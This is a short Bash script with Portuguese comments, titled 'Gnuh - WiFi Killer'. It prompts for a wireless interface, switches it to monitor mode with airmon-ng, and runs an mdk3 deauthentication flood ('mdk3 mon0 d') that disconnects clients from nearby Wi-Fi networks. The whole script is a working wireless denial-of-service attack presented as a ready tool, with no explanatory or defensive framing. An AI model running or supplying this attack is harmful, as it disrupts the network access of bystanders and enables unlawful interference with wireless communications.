#GNUH TIPS
clear #limpar tela

#COLOR CONFIG
red='\e[0;31m'
blue='\e[0;34m'
green='\e[0;32m'
NC='\e[0m'
#

echo -e "${blue}Gnuh - WiFi ${red}Killer${NC}"

iwconfig

read -e -p "Digite a Interface: " i

# monitorar interface
airmon-ng start "$i"
mdk3 mon0 d
airmon-ng stop mon0